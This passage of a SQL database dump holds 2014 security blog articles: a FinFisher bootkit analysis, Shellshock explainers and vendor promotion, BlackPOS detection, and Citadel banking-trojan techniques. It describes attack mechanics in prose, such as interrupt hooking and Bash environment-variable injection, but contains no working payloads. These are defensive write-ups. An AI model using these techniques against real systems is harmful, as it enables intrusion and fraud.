mode. This is different from protected mode. One of the differences is that we would have to calculate physical addresses using combinations of es:di and ds:si registers. The formula to calculate the physical addresses is (segment * 0x10) + offset. For example, if we are looking on the es:di pair, then es is our segment and di is our offset. All the addresses below are calculated using the formula above. Now, let’s take a closer look at the most interesting parts of the code. First, the malware calculates the address of the segment where it will copy the data (this is going to be the second time the blob of data is going to be copied): Next, the malware installs hooks for the INT 13h and INT 15h handlers. As can be seen from the code below, the malware offers no new ideas on how to hook the low-level interrupt handlers: At this point, hooks are installed for INT 13h and INT 15h, but the code for the functions that hooks INTs is yet to be copied to the calculated segment. The obvious next step for the malware is to copy the code for the hooked handlers: At this point, the malware is ready to return the control to the original MBR, but first, it needs to restore the original MBR to the 0x7C00 (the sector that holds the copy of the original MBR is stored elsewhere on the hard drive), and then it passes an execution to the original MBR: The given sample for the FinFisher bootkit does not provide any new techniques or improvements over other bootkits. The malware writers decided to install hooks for INT 13h and INT 15h handlers before the code for these handlers was copied into the memory; this can be a recipe for disaster. For example, if the code for hooked handler functions would fail to copy, this might cause the system to crash.', '\'Analysis\', \'Bootkit\', \'Malware\', \'Windows\'', 'https://securityintelligence.com/analysis-of-finfisher-bootkit/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (498, 'Heartbleed and Shellshock: The New Norm in Vulnerabilities', 'Martin McKeay', '2014-10-16', 'It’s been such a fun year, with two major, Internet shaking vulnerabilities called   and  . In years past either one would have been the news of the year in security and software by themselves, but together, they equate to a level of vulnerability we’ve rarely seen. But the truly frightening part is that both of these vulnerabilities are things we have to get used to, since they represent the new norm in vulnerabilities going forward. In other words, we should plan on seeing several of these class break level of vulnerabilities every year from now on.\n Just as the Internet was not originally built with security in mind, it wasn’t built with what we currently consider to be good programming practices either. As Robert Graham notes, Shellshock isn’t a blip, it’s a blimp, “ ” His analysis of the code in the Bourne Again Shell found significant amounts of antiquated coding practices, functions that are obsolete or banned, variables in all the wrong places and any number of coding mistakes anyone who’s received training in software development would (or at least should) never make in the 21st century. It’s not a condemnation of the people who originally wrote  , it’s simply a sign of how we’ve changed the way we code in the last 25 years.\n Here’s the problem: much of the code that we use on a daily basis, the code that we rely on to run the economic engine that is the Internet, was built during the same time period, using the same methodology and written to the same standards. The same spaghetti code exists in hundreds of other pieces of code that we’re using not only on the surface of the Internet, but also in the tiny little nooks and crannies that no one ever looks in. There are billions of lines of code that need to be reviewed using modern standards and then updated to make them safe and secure to continue using.\n Back to Robert Graham, who states that the  . While we’ve been saying for many years that open source projects have multiple people who are reviewing code and that it’s therefore as secure as possible, the truth is there are only a few people who have the time, skills and inclination to review most of the code that makes up modern open source projects. A lot of the old code is hard to understand, so developers are loathe to make changes for the sake of cleaning it up. They’d rather only make the changes they need to implement new features, which means that even if people are reviewing code written by people 25 years ago, it’s simply to make sure that new code works without breaking, rather than to make sure that old code wasn’t broken to begin with.\n The good news is that more people are starting to look at all this old code to see where the vulnerabilities are and how they can be fixed. The bad news is that at the same time, there are more people who are looking at all this old code to see where the vulnerabilities are and how they can be exploited. It’s much sexier to spend time looking at the old code than it’s ever been in the past. In part this is because that’s where all the attention from the press and management is right now. But a much larger part is because there is a treasure trove of hidden vulnerabilities that when found will garner the discoverer the attention of the press and the community, or allow attackers to have unfettered access to vulnerable systems until the security community catches up.\n We have many tools to discover vulnerabilities that didn’t exist even a decade ago. Static code analysis has progressed significantly, automated tools to analyze code are getting better every day and fuzzing was conceptualized in the late 80’s but didn’t become a common practice until relatively recent times. Not only have the tools become much better, the skills of the people testing, breaking and fixing software have progressed significantly. We have economies for both black hat and white hat hackers who find vulnerabilities, whether it’s underground forums or   that pay for each vulnerability and exploit found. It’s possible to make a lucrative living as a bug hunter, something inconceivable 25 years ago.\n The quality of the code that’s coming out with vulnerabilities is also improving in quality. It’s no longer good enough for many people to turn out a vulnerability, it often needs to progress beyond a proof of concept and into a fully functional exploit to be taken seriously. As one co-worker pointed out, this will produce exploits similar to quality to those created for the annual   event at  . These exploits are stable, repeatable and implemented as fully functional tools in many cases. Especially on the criminal side of the exploit market, this is likely to be the standard going forward, since it pays better to have a prepackaged exploit toolkit, rather than simply having a known vulnerability.\n In many ways Free Open Source Software (FOSS) is in a state similar to where Microsoft found itself a dozen years ago. Researchers and attackers had been beating at Microsoft software and found many major vulnerabilities. Code Red and Nimda were the most public examples of those vulnerabilities being exploited and caused Microsoft to create their  . It took many years of Microsoft working hard internally, re-educating their developers on how to code securely, creating new tools and processes to develop more secure code and basically making security one of their primary concerns.\n The FOSS movement is at the start of this same cycle, where a number of breaks in the foundation of open source will have to be made before resources and time are dedicated to securing software as a concern of primary importance. This may be the event that kills FOSS. The alternative is that many of the companies that rely on FOSS start putting more resources back into the community and support the software movement that makes much of the Internet possible.\n In the meantime, it’s imperative that businesses and consumers understand that we’re just at the beginning of a cycle of vulnerabilities being found in the software we rely on every day. We have to plan on vulnerabilities the magnitude of Shellshock and Heartbleed are going to become common events, perhaps as often as one or more a quarter for the foreseeable future. Rather than rely on the tactics of fire drills and patching, businesses need to start planning to deal with a series of unknown and unknowable vulnerabilities in their networks that go beyond the incident response plans most businesses currently have in place. It’s time to re-examine the links the security team has to other incident response teams within the corporation. It’s not enough to know which department is responsible for each type of system; to be capable of dealing with repeated vulnerabilities, we have to have to be capable of finding the specific administrators who are responsible for specific systems and how to communicate with them. We often think we have these contacts, but experience is a harsh teacher when a new vulnerability is disclosed and it takes days, or even weeks, to hunt down the current people responsible for a system because no one’s updated the administrators list in months or possibly years. It’s better to test these lines of communication now, while the stress is still relatively low, rather than wait until communication becomes a crucial issue.\n Second, the technical tools to detect compromises due to an unknown vulnerability have to be in place and functioning. Each organization has it’s own way of monitoring for suspicious activity, whether it’s baselines on CPU usage and network traffic, or a series of honey pots that alert teams when suspicious activity is happening. While there are few organizations that have the resources to do full packet capture for more than a few days worth of traffic, if any at all,   traffic caused by a vulnerability that’s being exploited but might not be public knowledge yet.\n Businesses and security teams need to brace themselves for impact of this coming torrent of new vulnerabilities. Management at all levels need to understand that it’s not going to be business as usual for some time to come, that more resources, more downtime and more disruptions are going to happen because of the vulnerabilities that are being discovered. Warnings now to expect further disruptions can help reduce the stress the business as a whole experiences and help smooth the communication efforts with other teams in the enterprise who need to respond to such incidents. Knowing there’s more to come might not make it easier for them to accept your help now, but it might make them less likely to say “Another vulnerability?”\n Security teams also need to learn to rotate incident responders out of high stress situations. Shellshock and Heartbleed have taught us that it takes a lot of time and energy to respond to events of this magnitude. The stress that it puts on an individual and a team to deal with the event has to be planned for and managed well, otherwise incident responders will burn out, won’t be able to react as well to the next emergency and no one will be trained to take their place when it’s absolutely necessary everyone is able to do their best. Teach more people to handle events and to take over in case the subject matter expert is on vacation, sick or simply left the company two weeks before.\n Incidents like Heartbleed and Shellshock are going to be more common in the near future, but hopefully there is a limited time frame for this level of vulnerability discovery. There is a diverse amount of software the next vulnerability could come from, whether it’s DNS, SSL, Apache, Nginx or some obscure piece of code that we use almost daily but rarely think of as a threat. The time for creating plans to deal with these vulnerabilities is now, before it’s an emergency. Decide who’s going to take charge, how communication channels will be used, how the patches will be deployed and how to rotate people into and out of the fire. But also understand how to deal with situations where there may be no patch, no work around and the only option may be to abandon software that is terminally broken.', '\'Heartbleed\', \'Open Source\', \'Shellshock\', \'Software Development\', \'Vulnerabilities\'', 'https://securityintelligence.com/heartbleed-and-shellshock-the-new-norm-in-vulnerabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (499, 'Are You Digging Deep? When Antivirus Is Not Enough', 'Michelle Alvarez', '2014-10-14', 'I’m not terribly fond of reality TV (my apologies to those who are). I often wonder, “How are they able to squeeze one more show out of the reality engine?” There are so many out there that appear to be the same thing; the differences are minute. We run into the same issue during malware analysis. Variants that spawn from the original often differ ever so slightly, forcing analysts to dig deeper than what an antivirus solution detects. One such analyst who rolls up his sleeves and dives in to discern these tiny malware differences is Lance Mueller, senior incident response analyst for  . While testing and researching the original   malware — yes, this thing continues to rear its ugly, data-siphoning head — and a newer variation, Mueller found that it is not hard to find it if you know what to look for. It is not hidden or cloaked by any type of rootkit technology. In other words, while it does exhibit some of the common malware characteristics, it also does not behave like other malware. Therefore, some of the   that we would typically look for are not there. Ideally, an antivirus scan would detect both of these threats. At some point, though, these were not detected by antivirus, and/or a scan couldn’t be performed. Mueller said that an antivirus scan would be one of the lowest-effort attempts to find the threats. He then said you should assume that they were either not detected or that conducting a malware scan was not an option. In the case of the   of BlackPOS, the malware installed itself as a service. It also has the capability to run as a normal process. However, it would not survive a reboot. Repeated installations of the malware yielded the same service name (mcfmisvc), but there have been reports that it can also pick some random names for the service from the registry, although I have not seen this behavior in any of the samples examined thus far. The name of the executable pointed to by the ImagePath registry value can be anything, as determined by the attacker. When the malware is installed as a service, the description of the service says, “McAfee Framework Management Instrumentation.” The malware scrapes memory and puts the track data into an innocuous-looking file named “McTrayErrorLogging.dll.” The data is obfuscated, so a GREP search would not find it. The BlackPOS has no command-and-control mechanism. It is designed to shuffle collected data to a common Windows file share (SMB) on another internal box so it can then be exfiltrated from there. This presents the following detection and analysis challenges: Given that you may start only with basic collected volatile data in an active threat assessment or  , you would only have the following: The above volatile data would clearly have references to the malware (name, running process), but what, if anything, would distinguish it from any other normal process? What if it’s named to look like an innocuous or legitimate executable? Given the assumptions that the antivirus solution comes back with a score of zero or is unavailable, what would draw your attention to the malware from reviewing a list of running processes or service names? Not very much. The name of the service, sure; we know, though, that as malware evolves, it uses other mechanisms or names. Now, assume you had an image of that same system and/or RAM, and the same assumptions applied to that antivirus detection come back as zero. What, if anything, would/could you do to help identify malware such as this? If you were faced with this scenario on an   engagement, what things would you rely on to help you detect malware such as this? If your company relies on a third party to perform incident investigations, ensure it is digging a little deeper and not relying on the “usual” subjects for attributes.', '\'Antivirus\', \'BlackPOS\', \'IBM Emergency Response Services\', \'Malware\', \'Malware Analysis\'', 'https://securityintelligence.com/are-you-digging-deep-when-antivirus-is-not-enough/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (500, 'Shellshock: Prevent, Detect and Respond', 'Rohan Ramesh', '2014-10-10', 'An old maxim tells us an ounce of prevention is worth a pound of cure. And that’s great advice — unless you unfortunately missed the prevention step and need a cure quickly. A quick Web search shows the severity of the recent Bash bug. There has been a lot of focus on prevention, which is great advice and something definitely worth listening to, but there hasn’t been a lot of information about the cure — until now. To implement the cure for  , organizations need a way to assess their endpoint environment and then deploy and manage the patches for the myriad operating systems in their environment. An effective solution provides policy-based installation of security updates, closed-loop verification and the ability to manage patches across multiple platforms from a single point of control. It must also shrink patch deployment time to reduce the risks associated with Shellshock. As organizations look for best practices on how to update all of their affected systems, they look for a solution that can do the following: To help organizations address this vulnerability, IBM provides security solutions that can help prevent, detect and respond to the Shellshock threat. IBM has been able to identify and protect against attacks caused by this threat through its IBM Security Network Intrusion Prevention product offering. With its unique focus on identifying and shielding this vulnerability from an attempted exploit, IBM has been helping clients protect against these kinds of exploits since 2007.  about how you could have prevented attackers from exploiting Shellshock and other similar vulnerabilities. If an endpoint has already been exploited by Shellshock before patches have been made available, the way to find the threat is by understanding the behavior of all the individual attack components and by using analytics to understand their relationship. The key tasks in detection include the following: A “closed loop” system can quickly detect threats and alert security administrators to take the necessary corrective actions. With  , you can quickly determine which endpoints — including servers, work stations and other devices — are vulnerable to the Bash bug.   can leverage data from network and endpoint security solutions to immediately see whether someone is trying to exploit an operating system vulnerability. IBM QRadar can then alert the security team to use endpoint management solutions, such as BigFix, to remediate the condition. Today, it is not a matter of if an organization will be breached, but rather a question of when a breach will take place. This means organizations need to have the ability to respond rapidly once an initial incident or vulnerability has been detected. The key response functions include the following: Having detected which endpoints are vulnerable and the various OS types and versions that these endpoints are running with Endpoint Manager, you now have to focus your efforts on patching these endpoints quickly and efficiently. BigFix can rapidly apply patches across multiple operating systems within minutes, including UNIX, Linux and OS X, all of which have reportedly been affected by Shellshock. BigFix customers have realized up to a 98 percent first-pass patch success rate and can rapidly apply Shellshock patches for all OS types, including CentOS-5 and CentOS-6, RHEL 5 and RHEL 6, zLinux, SLE 11 and SLE 11 System z, Solaris, Mac OS X and Ubuntu. With the manager’s ability to provide real-time visibility into the status of managed endpoints, you can confirm all your endpoints have been patched and are more secure. BigFix supports over 130 platforms out of the box and helps ensure your endpoints are in continuous compliance with your security and regulatory policies — all through a single console, regardless of endpoint type, OS version or location. By automating the remediation, BigFix helps customers close the loop by supporting the response phase of the IBM Threat Protection System. An ounce of protection is certainly worth a pound of cure. With IBM Security solutions, you get both.', '\'Bash Bug\', \'Endpoint Security\', \'Endpoint Security Solutions\', \'IBM BigFix\', \'Shellshock\'', 'https://securityintelligence.com/shellshock-prevent-detect-and-respond/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (501, 'JPMorgan Chase Breach Puts Renewed Focus on Malware Attacks at Large Organizations', 'Dana Tamir', '2014-10-8', 'The recent breach into JPMorgan Chase’s network — one of the   in history — may have been caused by malware, according to  . At this point, full details on the breach are still unavailable, but according to the article, published on Oct. 2: Unfortunately, possible malware involvement in the JPMorgan breach is not a surprising development. An IBM Trusteer-sponsored Ponemon study titled “The State of Advanced Persistent Threats” reveals that malware is the top method used in APT-related incidents. Ninety-three percent of the respondents say malware was the source of the attack. The   variants, coupled with continuously evolving evasion techniques, makes advanced malware a powerful tool. Over the last few years, new developments have enabled cyberattackers to silently infect user PCs with malware, using techniques like drive-by downloads, watering-hole attacks, malvertising and exploitation of vulnerabilities in other end-user applications. They enabled cyberattackers to silently grab information from compromised PCs. This information typically includes login credentials, Web-application data as well as data from emails and documents. In some cases, malware can even provide full remote control over the infected machine. Sophisticated evasion techniques ensure that the malware remains undetected and the breach progresses stealthily. As for employee PCs, they continue to be an easy target. One reason is the  . Many employees use their PCs to access external websites, open email attachments and download documents and applications for work or personal reasons. Using sophisticated social-engineering schemes, cybercriminals manipulate these users to open weaponized or compromised content, which can silently download malware on employee PCs. User awareness programs have helped reduce risky behaviors of employees, making employees aware of the risk associated with accessing untrusted websites and opening untrusted files. Still, user awareness programs have not completely eliminated the risk of malware infections. The second reason is lack of effective protection on the PCs. Most employee PCs are still protected only with antivirus software, which cannot provide the defenses needed for preventing advanced malware infections on its own. Much has been   about this already. However, concerned with computer performance impact, organizations falter to add protections on employees PCs. Until recently, organizations invested much more heavily in network protections rather than endpoint controls in order to protect against advanced threats. While network detection solutions can help reduce the number of malware infections, they do not eliminate malware infections completely. Evasion techniques added to advanced malware were specifically designed to bypass these detections, for example, by verifying that a real user PC has been reached before the malware starts executing. This is why it is important to add advanced malware protection on the employee endpoint. Additionally, network controls are ineffective at protecting off-network and semi-managed employee endpoints. Today, many employees continue to work while outside of the corporate network, using their corporate-provided PCs or home computers. Surfing the Web on unprotected public Wi-Fi networks increases the risk of malware infections. If employees then use infected PCs to access corporate resources and sensitive business data, the cyberattacker can grab information that will allow network infiltration. Today more than ever, it is critical to protect employee PCs against advanced malware with  . While this is especially critical for employee endpoints that are used for accessing sensitive systems and data, this is important for all employee endpoints. Once a machine that can access the network is compromised, it enables the launch of an attack from within the network. This enables the attacker to do a lot more than from the outside. By using a compromised system to launch attacks, the attacker has not only better access to systems and resources, but also more chances of remaining undetected.', '\'Advanced Persistent Threat (APT)\', \'Banking Trojan\', \'Data Breach\', \'Dyre\', \'Endpoint Security\', \'JPMorgan Chase\', \'Malware\', \'Network Security\', \'Ponemon Institute\', \'Security Breach\', \'Trusteer\'', 'https://securityintelligence.com/jpmorgan-chase-breach-puts-renewed-focus-on-malware-attacks-at-large-organizations/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (502, 'Fraud Risk Engines: The Statistics Are Not in Your Favor', 'Etay Maor', '2014-10-1', 'In my last article, I discussed  . While different forms of authentication measures will continue to be used, we know today that advanced malware overcomes these by spoofing the victim’s behavior, proxying through the victim’s device or just downright asking the victim for his or her passwords using social-enginnering techniques. Roughly 10 years ago, security vendors started working on solutions to the authentication issue and, thus, authentication risk engines were born. Today, there is a wide variety of risk engine flavors to choose from. Leading vendors offer what they call adaptive authentication platforms that offer multiple deployment models, integration options, application programming interfaces and management platforms that all have one very basic weakness: The solution was designed for the 2005 fraud threat landscape. Today’s fraudsters have used a wide variety of tools and techniques to build all kinds of new fraud methods specifically intended to evade these adaptive solutions. The following is a look into how these risk engines are designed and the root cause for their failure in detecting today’s cybercriminals: The three main issues with statistical-based risk engines are as follows: When statistical risk-based authentication models were introduced, they were based on the assumption that fraud could be prevented using simple authentication. This assumption allowed these products to identify a relatively high percentage of transactions as risky and perform elevated authentication for all of them. As threats have become more sophisticated and bypassing two-factor authentication has become common for cybercriminals, stopping fraud now requires more decisive action, such as putting the transaction on hold and manually reviewing high-risk and high-value transactions. Most traditional risk engines use a pure statistical model for risk scoring, such as Naïve Bayesian, Decision Trees and Neural Networks. However, these statistical models rely heavily on device identification as their detection method. They lack visibility into risk factors and pre-login activity, such as the user visiting a phishing site or getting infected with advanced malware. They use a limited subset of the population and possible events as their learning platform and are designed to identify historical fraud tactics instead of protecting the account against the actual method of operation (modus operandi) used by the attacker. The statistical models are inaccurate and operate in a predictive/pattern-based mode, tuned to generate alerts for a given percent of users. This results in a high rate of false positives and false negatives. Once this ratio is established, changes to the model are difficult and slow, constituting a significant barrier to rapid and effective handling in the evolving and constantly changing fraud landscape. Let’s take a look at one example where a traditional risk engine has little to no chance of detecting the cybercriminal’s attack.  has been around for several years. In addition to offering traditional Trojan tools such as a keylogger, screen scraper and HTML injection, Citadel also offers two very interesting modules: a Virtual Network Connection (VNC) option and a video-capturing option. The video-capturing option lets attackers make videos of the victim’s login process. Why would cybercriminals trouble themselves with making videos? This is a very easy way to learn about users’ behavior and how they interact with online banking sites. This allows cybercriminals to imitate and emulate victims’ behavior when trying to take over an account. Combine the knowledge of how the user interacts with the website along with stolen credentials and the ability to proxy through the victim’s machine, and the attack is likely to be a success. The VNC module takes this idea a step further. The attacker can comfortably wait until a user has authenticated the online banking session, and as soon as the victim has entered his or her bank account, the cybercriminal VNCs into the targeted device (the user will see a message “from the bank” asking to pause for security reasons) and takes over the authenticated session using the victim’s machine. This type of attack was so successful that new Citadel variants have a way to ensure VNC capabilities remain persistent on the targeted device even if the  , and the malware is also used to   as well as online banking victims. So what’s next? How can we fight back against the latest threats? It seems that GameOver Zeus, Tinba, Gozi, Citadel and other types of Trojan malware are getting the best of us, so we need a new way to prevent these sophisticated attacks. An evidence-based criminal detection solution that is founded upon visibility to current threats, correlation of risk factors across multiple channels and attack vectors and the continuous research of future trends is the answer we need to combat the new world of Web fraud techniques. By combining data from multiple account access points (such as online and mobile) along with additional threat detection systems (such as malware detection and phishing detection), an organization can benefit from a holistic solution that helps detect fraud across multiple vectors, devices and fraud techniques that may put the account at risk. This is all performed without burdening the end user with additional authentication requests while also minimizing false positive rates to assure the bank’s security team is not overloaded with investigating legitimate accesses. Fraud teams are seeking a new approach to risk-based authentication solutions due to their typically inaccurate risk scores and their negative impact on both operations and end users. The next-generation approach to   needs to use evidence-based fraud indicators to more accurately and effectively detect fraudulent transactions while improving the end-user experience and reducing the operational impact.', '\'Banking\', \'Citadel Malware\', \'Gameover Zeus (GOZ)\', \'HTML Injection\', \'Malware\', \'Multifactor Authentication (MFA)\', \'Phishing\', \'Tinba\', \'Trojan\', \'Two-Factor Authentication (2FA)\', \'Virtual Network Connection (VNC)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/fraud-risk-engines-the-statistics-are-not-in-your-favor/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (503, 'Bash Shellshock Exploits Could’ve Been Avoided 7 Years Ago. What To Do Today!', 'Michael Hamelin', '2014-9-26', 'Opening email, reading your favorite blog or turning on the news each day seems to bring a new round of disclosures and warnings about security threats and vulnerabilities. And the past 36 hours have revealed yet another potential security concern after the new Shellshock vulnerability was announced.\n At first glance, the recent announcement of a new vulnerability (classified on the National Vulnerability Database as  ) in the Bash shell might not seem like a big deal. The vulnerability, nicknamed “ ,” is remotely exploitable under the right conditions and affects the Bash shell versions 1.14 through 4.3, which means that it has been around for more than 20 years. When we consider how prevalent UNIX and Linux systems are, how common the Bash shell is, the age of the vulnerability and the relative ease of exploitation, it becomes clear why security professionals are taking notice. And while it’s still being determined if Shellshock is as damaging as Heartbleed, it’s certainly as serious.\n The crux of the vulnerability is centered on how the Bash shell processes environment variables. The vulnerability allows for remote execution of arbitrary code placed into an environment variable. When a function is assigned to a variable, the Bash shell executes any commands following the function definition.\n Several websites have published a simple mechanism that can be used to help determine whether a system is vulnerable. From a command line, enter the following:\n If the system is vulnerable, the output should be:\n \n \n What is happening is that the “env” command (used to set and display environment variables) defines “x” as a shell function (the commands between the tick [‘] marks). Notice that the syntax dictates that the definition of function starts with the opening Poisson bracket ‘{‘ and ends at the closing right Poisson bracket ‘}.’ When the command “bash” is executed, a new bash shell is created that processes all the shell variables and function definitions defined in the parent shell, including the definition of function ‘x.’ This is done so that the new shell can inherit the definition of all the environment variables and functions. The problem is that it sees the definition of ‘x’ ending at “}” and then goes ahead to process the rest of the string “echo vulnerable” as a shell command and executes it. This behavior is what is at the heart of the vulnerability. If the system is not vulnerable, the result will be an error message followed by “this is a test.” That is because on a system that is not vulnerable, the string appended after the definition of the function “x” (i.e., after the closing Poisson bracket “}”) generates an error message. For most organizations, fixing this requires a vendor patch. In extreme circumstances, it is technically possible to download the fixed Bash source code and compile your own binary, though that route is not recommended for most and should only be considered as a last resort after careful planning.\n The best course of action for organizations at this point is to do the following: While vendor patches are a first line of defense, IBM can help protect customers from the exploit of this vulnerability with the IBM Security Network Intrusion Prevention product offerings. In fact, IBM has been helping to protect customers from this and similar attacks since 2007, thanks to  . IBM is able to identify and help protect from Shellshock using a signature named Shell_Command_Injection, which was released in 2007. So, the IBM Security IPS offerings have been able to identify and protect from this vulnerability for the past seven years. This signature identifies shell commands (operating system commands) traversing the network inside protocols where they do not normally belong — for instance, inside of the HTTP header field of traffic destined to a Web server. IBM’s approach to protecting clients is fundamentally  . Instead of trying to detect the latest exploit attempt, requiring constant additions and/or modification of signatures, IBM focuses on identifying and then shielding the vulnerability from an attempted exploit. In the case of Shellshock, IBM has been able to identify and protect against exploits of this nature since June 2007.', '\'Linux\', \'Shellshock\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/how-bash-shellshock-bug-couldve-been-avoided-7-years-ago/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (504, 'You Want to Plug What in? 5 Tips for Evaluating IoT Devices', 'Andrew Hay', '2014-9-25', 'Personal Internet-connected electronics, designed primarily for home use, are rapidly finding their way into the enterprise. From web-enabled streaming video cameras to connected digital picture frames to large commercial refrigerators, it feels as though everything in our lives is now connected to the Internet. Remember when “Shadow IT” wasn’t a thing and the biggest concern we had was that someone would bring in an external modem so that they could remotely connect? Those were the days. Now we have to worry about what our users are bringing into the office that might connect to the Internet, must connect to the Internet to operate, or may be exploited for malicious data exfiltration. Welcome to the  . I’ll draw on an  . Shortly after Google announced that they were acquiring Nest, I started poking around to see exactly what the thermostats could communicate with. A quick Google search for nest firewall ports (which is what I commonly append to a product/application term when looking for what ports are used) provided 433,000 results. Phew, that’s a lot. After looking at several pages, the general consensus from Nest users was that port 9543/tcp needed to be allowed through their respective home routers for the product to work. One page provided the FQDN that the Nest thermostat connects to a domain in the format of: XXXX.transport.nest.com The domain is hosted in Amazon AWS and uses an IP address associated with Amazon’s Elastic Load Balancing (ELB) service, likely to help distribute the load across multiple guest instances. It’s probably safe to assume that Nest is using Amazon’s VPC functionality given the number of devices it has claimed to have sold to date ( ). Unfortunately, without getting the device-to-server count directly from Nest, I doubt we’ll ever really know the final number. It’s also probably safe to assume that the IP addresses employed by Nest are load balanced (using ELB) to the servers within its VPC network. This workflow, though somewhat time consuming, would be invaluable data to help decide if I wanted to utilize this device on my home or corporate network. Before rushing to open unfettered access for an employee’s shiny new toy, here are some tips on how to evaluate IoT devices prior to allowing them on your corporate network: Hopefully these tips will help you think about evaluating IoT devices in the enterprise. Consumer devices are coming, whether you like them on your network or not. How you handle their deployment, however, is entirely up to you.', '\'Amazon AWS\', \'Embedded Devices\', \'HTTPS\', \'Internet of Things (IoT)\', \'Secure Sockets Layer (SSL)\', \'Shadow IT\', \'Smart Devices\'', 'https://securityintelligence.com/you-want-to-plug-what-in-5-tips-for-evaluating-iot-devices/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (505, 'A Look Back at ‘The State of Incident Response’ by Bruce Schneier', 'Zubair Ashraf', '2014-9-24', 'In my continuing series of  , I will be covering   — yes, it can be called a keynote even though it is more of a briefing. By the way, Black Hat: Next time, please give him appropriate space; people were lining up outside the room waiting to get in because of the lack of space. I will be sharing what I learned from his speech in my own words with selected graphics. Schneier’s “ ” talk is available online, but if you don’t have an hour to watch that, read this as a recap. Hopefully, it will help you take some action or remind you of your New Year’s resolution to improve security. Finally, I hope this serves as a good resource for those starting in the field who are too focused on their day-to-day cyberdefense role to step back and look at the bigger picture. Schneier started by talking about three trends in  , followed by information technology (IT) economics, a piece of human psychology and how they all affect the security industry. He used that to argue how we need more and better incident response tools and services and how the IT economics change when it comes to these services and tools. He then shared a systems theory from the Air Force and how it can be used to arrive at the proper response. But first, let’s talk about the trends. The first trend he mentions is that we are in a cloud era in which individuals and organizations alike are putting more and more data into the cloud. We have different cloud providers for all sorts of information: Who we meet, when we meet, what we eat, where we’ve been, where we’re going, who we’re with, what we’re wearing, what we like, what we don’t like, who we like, what we’re in the market for, what we’re worried about — you get the idea. Similar things apply from an organizational perspective. Add analytics (big data/metadata), and a lot can be predicted. How many of us — not just us security practitioners — know or care to know the security posture of these services providers in the cloud? We usually don’t even know which OS or hardware they are using. Similarly, how much understanding do we have of the variety of devices we use to access information, or that our children or employees use to access information? The point is, we are losing control over our data. As defenses get stronger, so do the attacks. It is not only the nation-state attackers that are getting more skilled and focused; this is happening all around. The cybercrime market is maturing pretty well, with the supply chain in place, so this provides significant incentives for financially motivated attackers to invest in sophisticated attacks. In “The State of Incident Response,” Schneier gave an analogy of identifying attackers based on their weaponry. If you were to see a tank on the street, you would not think it belongs to street thugs. However, in the cyberworld, anyone can have any sort of weaponry. I would say that this is true to an extent, but we can still tell a lot about the attacker based on the sophistication level and targets of the attack. Another important trend is discovering that being relatively secure does not mean you are safe. To illustrate this, I would like to use the joke about two hikers and an attacking bear. One hiker says to the other, “I don’t have to outrun the bear; I only have to outrun you!” So, for relative security, as long as you are a harder target than those around you, typical criminals would keep stealing from those who are relatively easier to go for. On the other hand, you may have an advanced persistent threat (APT) or a highly skilled and highly focused adversary (I have no intention of taking sides in the debate about whether an APT is a who or a what) who just wants you or your data. This could be because they hate you or because you have something that they want. These attacks are very persistent, so if you think of it this way, your defense planning may change, too. You need to start thinking about what you would do if these  . The third and last trend Schneier talks about is the immense involvement of the  , whether through regulations and policies, the defense of critical infrastructure, the creation of cybercommands, hoarding vulnerabilities or the cyber arms race. Schneier then shared four principles of IT economics that will help us understand why we are seeing some strange behaviors in the security industry. He reminded the audience of the often forgotten Metcalfe’s law, which states that “the value of a network is proportional to the square of the number of connected users of the system.” This is true for both real and virtual networks. The more users on a social media site, the more engaging and attractive it becomes. The same is true for the use of a particular brand, OS, instant messenger, etc. This means a single dominant player emerges in the market as it grows. For instance, most people use Facebook because most of the people they know use Facebook. As is the case in IT, various behaviors emerge when the fixed cost (the cost to develop the first unit) is significantly higher (as it includes design, research and development costs, etc.) than the marginal cost (the cost to produce an additional unit thereafter). Artificial barriers are then put up to increase the marginal cost so competitors can’t compete, and the original designer recovers the cost. Higher fixed costs also make stealing designs very attractive to criminals because they can take on just the marginal costs and sell cheap copies. On the other hand, if someone has already invested in the high design cost and can protect the product from being replicated, then it can discourage competition, too. For example, since Google has pretty much already driven all around the world, it is hard for someone to duplicate Google Maps and take on the cost. Finally, those vendors who have already recovered their fixed cost can start selling cheaper products, and new vendors will have a hard time selling at a higher price that will help them recover their fixed cost. This is especially true because buyers lack the ability to distinguish between good and mediocre products, as we will see in the last principle of the lemon market theory. This also drives the trend of market giants continuing to grow. The higher the cost of switching, the more likely customers are to stay with a vendor, even when there is poor customer service. This is what we see around noncompatible formats — making it hard to take your data with you when you leave, paying for data transfers and paying to train new staff on a new product, for example. Finally, the last economics principle Schneier mentioned is based on the work “The Market for Lemons,” which is essentially the principle that when the buyer knows very little about a product and cannot distinguish between good (cherries) and mediocre (lemons), he or she will buy the one being offered at an average price. Therefore, this practice drives the good products from the market. Schneier added that, in the security industry, this is especially true because the requirements are nonfunctional — how does the average buyer determine which product is a good encryption product? To balance this, the economic concept of signaling comes into play, so you see warranties from the seller, certifications, best practices, references and testimonials. This is why it is important to be aware of your psychological biases so that you can make more informed decisions. According to this concept, if we are given a choice between taking $1,000 cash or flipping a coin and getting $2,000, most people will avoid the risk and take the cash. On the other hand, if we are given the option to lose $1,000 right now or go for a coin flip and lose $2,000, most will take the risk and go for the flip. This is what is known as the prospect theory; when it comes to gain, humans are mostly risk adverse, but when it comes to losses, we are risk seekers. Consequently, it is hard to sell security because most people avoid investing in security or underinvest and take the risk of a bigger financial hit if something goes wrong. Security is a combination of protection, detection and response. We need more response capabilities as we lose control of data with the cloud trend, attacks become more sophisticated and we continue our natural tendency to underinvest in protection and detection. As we are not generally able to distinguish between good and mediocre products, we are more prone to having mediocre-quality defenses. Therefore, response becomes more and more essential. Now comes the crux of the 